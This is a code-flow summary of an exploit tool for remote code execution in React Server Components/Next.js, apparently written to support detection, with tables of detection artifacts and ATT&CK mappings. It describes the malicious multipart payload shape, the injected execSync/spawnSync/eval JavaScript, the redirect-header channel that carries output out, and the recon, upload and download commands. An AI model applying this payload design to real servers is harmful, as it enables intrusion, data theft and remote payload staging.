# React2Shell Exploit Tool - Code Flow Summary

This document summarizes the code flow of `react2shell-tool`, focusing on how the tool creates multipart React Server Components payloads, sends POST requests with `Next-Action`, extracts results from the `X-Action-Redirect` header, and provides an interactive shell with command execution, eval-based reconnaissance, upload/download, and file operations.

## Source Map

| Component | Path | Role |
|---|---|---|
| Interactive launcher | `../../resources/payloads/react2shell-tool/run_exploit.py` | Entry point that calls `exploit_tool.main.main()` |
| Single-shot exploit | `../../resources/payloads/react2shell-tool/exploit.py` | Standalone version for one command or base64 upload through `echo` |
| CLI parser | `../../resources/payloads/react2shell-tool/exploit_tool/main.py` | Parses `--target`, `--timeout`, and creates `InteractiveShell` |
| Interactive shell | `../../resources/payloads/react2shell-tool/exploit_tool/shell.py` | REPL, command dispatch, history, run/default execution |
| Exploit engine | `../../resources/payloads/react2shell-tool/exploit_tool/engine.py` | Creates HTTP session, sends POST, parses response |
| Payload generator | `../../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py` | Builds multipart body and JavaScript injection |
| Config | `../../resources/payloads/react2shell-tool/exploit_tool/config.py` | Target URL normalization and timeout |
| Built-ins | `../../resources/payloads/react2shell-tool/exploit_tool/commands/builtin.py` | help, info, timeout, eval, history |
| Recon commands | `../../resources/payloads/react2shell-tool/exploit_tool/commands/recon.py` | sysinfo, ipconfig, env, domain, ls, readfile through Node.js APIs |
| File operations | `../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py` | upload, decode, copyfile, rename, download through Node.js `fs` |
| Charcode helper | `../../resources/payloads/react2shell-tool/exploit_tool/utils.py` | Converts JS strings to `String.fromCharCode(...)` |
| Local encoder | `../../resources/payloads/react2shell-tool/encode_payload.py` | Encodes local files to base64/certutil-compatible text |
| Local decoder | `../../resources/payloads/react2shell-tool/decode_payload.py` | Decodes base64/certutil-compatible text back to local binary |

## High-Level Runtime Flow

```text
run_exploit.py
  -> exploit_tool.main.main()
       -> parse -t/--target and -T/--timeout
       -> InteractiveShell(target)
            -> ExploitConfig.normalize_url()
            -> ExploitEngine(config)
            -> FileOperations / BuiltinCommands / ReconCommands
       -> shell.run()
            -> test connection with engine.execute("whoami")
            -> read operator input
            -> dispatch built-in / recon / file-op / run / default command
            -> engine.execute(command, mode flags)
                 -> PayloadGenerator.build_exploit_payload()
                 -> craft_headers()
                 -> HTTP POST target_url
                 -> parse X-Action-Redirect
                 -> base64 decode command output
```

Core request/response flow:

```text
InteractiveShell command
  -> ExploitEngine.execute(command, use_eval/use_spawn)
  -> PayloadGenerator.build_exploit_payload()
  -> POST / with:
       Next-Action: x
       Content-Type: multipart/form-data; boundary=----HacxMeBoundaryX9K2pLvN4MqR8TdF
  -> target React/Next server evaluates injected _prefix
  -> injected code throws NEXT_REDIRECT with /login?a=<base64 output>
  -> response header X-Action-Redirect contains encoded output
  -> engine.parse_response() extracts and decodes output
```

## Vulnerability Model Used by the Tool

The tool targets React Server Components / Next.js request handling where a multipart POST body can supply a malicious model object. Field `0` contains a JSON object with:

```text
"then":"$1:__proto__:then"
"_response":{"_prefix":"<injected JavaScript>"}
"_formData":{"get":"$1:constructor:constructor"}
```

Field `1` is `"$@0"` and field `2` is `[]`. This shape is designed to make the vulnerable server deserialize attacker-controlled model data and execute the `_prefix` JavaScript inside the Node.js process.

Output exfiltration is not done through the response body. Each payload converts output to base64 and throws a Next.js redirect-shaped error:

```text
NEXT_REDIRECT;push;/login?a=<base64>;307;
```

`engine.py` then reads `X-Action-Redirect`, extracts `/login?a=...`, URL-decodes it, base64-decodes it, and prints the decoded output.

## Entry Points

### Interactive Mode

`run_exploit.py` only imports and calls `exploit_tool.main.main()`. `main.py` requires:

```text
-t / --target   target URL or bare host
-T / --timeout  request timeout, default 15 seconds
```

`ExploitConfig.normalize_url()` prepends `http://` when the user passes a bare hostname. After setup, `InteractiveShell.run()` performs an initial connection test with `whoami`, then enters the REPL.

### Single-Shot Mode

`exploit.py` is a standalone version that duplicates the core classes in one file. It supports:

```text
-t / --target
-c / --command
-f / --upload-file
-T / --timeout
```

In normal command mode, it builds one `execSync` payload. In `--upload-file` mode, it reads a local base64 text file and sets the payload command to:

```text
echo <base64 content> > out.b64
```

This upload path is simpler than the interactive `FileOperations.upload()` path and relies on shell command execution on the target.

## Payload Construction

`PayloadGenerator.build_exploit_payload(command, use_eval=False, use_spawn=False)` has three execution modes.

### Default execSync Mode

Default mode is used for any unrecognized shell input:

```text
process.mainModule.require('child_process').execSync('<command>').toString()
```

On Windows, this normally results in `node.exe` spawning `cmd.exe /d /s /c <command>` through Node's `execSync()` implementation. The tool waits for the command to finish, converts stdout to base64, and returns it through the redirect header.

`sanitize_command()` escapes backslashes, double quotes, single quotes, and removes newlines before placing the operator command inside the JavaScript string.

### eval Mode

Eval mode is used by the `eval` built-in, file operations, and recon commands. The injected JavaScript calls:

```text
eval('<command>')
```

For complex JavaScript, callers usually wrap code as:

```text
eval(String.fromCharCode(<comma-separated char codes>))
```

This avoids nested quote and backslash conflicts inside JSON and JavaScript string literals. Eval mode runs inside the already-compromised Node.js process and does not require a child process unless the JavaScript itself calls `child_process`.

### spawnSync Mode

The `run <exe> [args...]` command sets `use_spawn=True`. `parse_command_for_spawn()` splits the first token as executable and remaining tokens as arguments, then the payload runs:

```text
var cp = process.mainModule.require('child_process');
var res = cp.spawnSync('<exe>', ['<arg1>'], {shell:false, encoding:'utf8'});
```

This directly spawns the target executable without invoking `cmd.exe`. The HTTP request blocks until the spawned process exits.

## HTTP Request Details

`ExploitEngine.craft_headers()` creates:

| Header | Value |
|---|---|
| `Next-Action` | `x` |
| `X-Nextjs-Request-Id` | 8 hex chars from SHA-256 of current timestamp |
| `X-Nextjs-Html-Request-Id` | 20 hex chars from SHA-256 of current timestamp |
| `Content-Type` | `multipart/form-data; boundary=----HacxMeBoundaryX9K2pLvN4MqR8TdF` |
| `User-Agent` | Firefox-like Linux user agent |

The request uses `requests.Session.post()` with `allow_redirects=False` and `verify=False`. The engine classifies failures as `timeout`, `ssl`, `forbidden`, `server_error`, or `unknown`.

## Interactive Shell Dispatch

`InteractiveShell.run()` parses the first token and dispatches commands in this order:

| Command family | Handler | Execution behavior |
|---|---|---|
| `help`, `clear`, `info`, `history`, `timeout`, `eval` | `BuiltinCommands` | Mostly eval-based; `clear` is local terminal only |
| `sysinfo`, `ipconfig`, `env`, `domain`, `ls`, `readfile` | `ReconCommands` | Node.js APIs through eval, no process spawn |
| `upload`, `decode`, `copyfile`, `rename`, `download` | `FileOperations` | Node.js `fs` APIs through eval, no process spawn |
| `run` | `InteractiveShell.execute_command_spawn()` | `child_process.spawnSync(..., shell:false)` |
| Anything else | `InteractiveShell.execute_command()` | `child_process.execSync()` |

The prompt includes the normalized target host and command number. `command_history` stores operator commands for `history`.

## Recon Commands

`ReconCommands` uses `_eval_fn(js_body)` to wrap JavaScript as:

```text
(new Function(String.fromCharCode(<body>)))()
```

This pattern allows `var` declarations and `return` statements while still being passed through the eval payload path.

| Command | Node.js APIs | Output |
|---|---|---|
| `sysinfo` | `os.hostname()`, `os.platform()`, `os.version()`, `os.userInfo()`, `process.cwd()` | Host, user, cwd, OS, arch, uptime, memory |
| `ipconfig` | `os.networkInterfaces()`, `dns.getServers()` | Interfaces, IPs, MACs, DNS servers |
| `env [filter]` | `process.env` | Environment variables, optional substring filter |
| `domain` | `process.env` | `COMPUTERNAME`, `USERNAME`, `USERDOMAIN`, `USERDNSDOMAIN`, `LOGONSERVER`, profile paths |
| `ls [path]` | `fs.readdirSync()`, `fs.statSync()`, `path.join()` | Directory listing with size and directory flag |
| `readfile <path>` | `fs.readFileSync(path, 'utf8')` | Text file contents |

These commands are designed to collect host and environment data without `cmd.exe`, PowerShell, or native OS command process creation.

## File Operation Flow

File operations also use eval and Node.js `fs`, so the main target-side process remains `node.exe`.

### Upload

`upload <local_file> [remote_dest]` reads a local base64 text file, defaults remote destination to `out.b64`, splits content into 2000-character chunks, then sends each chunk as one eval request:

```text
chunk 0 -> fs.writeFileSync(dest, chunk)
chunk N -> fs.appendFileSync(dest, chunk)
```

The local file is expected to already contain base64 text. `encode_payload.py` can create a certutil-compatible base64 text file from any local input.

### Decode

`decode <input.b64> <output.bin>` runs:

```text
fs.writeFileSync(output, Buffer.from(fs.readFileSync(input, 'utf8').trim(), 'base64'))
```

This converts an uploaded base64 text file into the final binary on the target.

### Copy and Rename

`copyfile` and `rename` call:

```text
fs.copyFileSync(src, dst)
fs.renameSync(old, new)
```

Both treat `server_error` as probable success because some no-output Node.js calls can cause the expected redirect extraction to fail even though the filesystem action completed.

### Download

`download <remote_path>` is binary-safe and chunked:

```text
fs.statSync(path).size
openSync/readability check
loop:
  fs.openSync(path, 'r')
  fs.readSync(fd, buffer, 0, read_size, offset)
  buffer.toString('base64')
  closeSync(fd)
local Python base64-decodes each chunk and writes downloaded_<filename>
```

Chunk size is 8192 bytes. The target sends each chunk back through the same redirect-header base64 channel.

## Local Encode / Decode Helpers

`encode_payload.py` and `decode_payload.py` run locally, not on the target.

`encode_payload.py`:

1. Reads input as bytes.
2. Base64-encodes it.
3. Splits output into 64-character lines by default.
4. Optionally adds certificate markers with `--header`.
5. Writes a text output file.

`decode_payload.py`:

1. Reads ASCII base64 text.
2. Removes optional `BEGIN/END CERTIFICATE` markers unless `--keep-headers` is set.
3. Base64-decodes to bytes.
4. Writes the output file in binary mode.

## Detection-Relevant Code Paths

| Behavior | Code path | Observable artifact |
|---|---|---|
| React2Shell exploit request | `ExploitEngine.execute()` -> `session.post()` | HTTP POST to target with `Next-Action: x` and multipart body |
| Static multipart boundary | `PayloadGenerator.build_exploit_payload()` | Boundary string `----HacxMeBoundaryX9K2pLvN4MqR8TdF` |
| Malicious Flight model field | `build_exploit_payload()` field `0` | Multipart field containing `"then":"$1:__proto__:then"` and `_response._prefix` |
| Model reference trigger | `build_exploit_payload()` field `1` | Multipart field body `"$@0"` |
| Redirect-header output channel | injected JavaScript -> `engine.parse_response()` | `X-Action-Redirect: /login?a=<base64>;307;` |
| OS command execution | default shell command -> `execSync()` | `node.exe` spawns shell process such as `cmd.exe` on Windows |
| Direct process execution | `run` -> `spawnSync(..., shell:false)` | `node.exe` spawns specified executable directly |
| In-process JavaScript execution | `eval` / recon / file ops | Node.js process calls `eval()` / `new Function()` without child process |
| Node.js recon | `ReconCommands` | Access to `os`, `dns`, `fs`, `path`, and `process.env` modules |
| File upload | `FileOperations.upload()` | Repeated POSTs write/append base64 chunks to target file |
| Target-side base64 decode | `FileOperations.decode()` | Node.js writes binary output from base64 text |
| File download | `FileOperations.download()` | Repeated POSTs read target file chunks and return base64 in redirect header |
| Request ID generation | `PayloadGenerator.generate_hash()` | Timestamp-derived hex values in `X-Nextjs-Request-Id` headers |
| TLS verification disabled | `requests.Session.post(..., verify=False)` | Client accepts invalid target certificates |

## ATT&CK-Relevant Behaviors

| Behavior | Likely ATT&CK mapping |
|---|---|
| Exploiting vulnerable public React/Next application | `T1190` Exploit Public-Facing Application |
| Server-side JavaScript execution through deserialization/request parsing | `T1059.007` Command and Scripting Interpreter: JavaScript |
| `execSync()` command execution through shell | `T1059.003` Command and Scripting Interpreter: Windows Command Shell on Windows, or shell equivalent on Linux |
| Direct executable launch with `spawnSync(..., shell:false)` | `T1106` Native API / execution behavior, depending scenario mapping |
| Uploading payload chunks through the web exploit channel | `T1105` Ingress Tool Transfer |
| Reading files through Node.js `fs` and returning contents | `T1005` Data from Local System |
| Enumerating host/network/environment with Node.js APIs | `T1082`, `T1016`, `T1033`, and related Discovery techniques depending specific command |
| Returning command/file output via HTTP response header | `T1041` Exfiltration Over C2 Channel or `T1105`, depending scenario context |

## Reading Order

1. `README.md` for operator-facing usage and mode overview.
2. `run_exploit.py` and `exploit_tool/main.py` for interactive entry point.
3. `exploit_tool/shell.py` for REPL dispatch and command families.
4. `exploit_tool/payload_generator.py` for multipart body and injected JavaScript variants.
5. `exploit_tool/engine.py` for HTTP request creation and response parsing.
6. `exploit_tool/commands/recon.py` for no-spawn discovery behavior.
7. `exploit_tool/commands/file_ops.py` for upload, decode, copy, rename, and download implementation.
8. `exploit.py` only if single-shot behavior or `--upload-file` behavior matters.
9. `encode_payload.py` and `decode_payload.py` for local base64 preparation workflows.
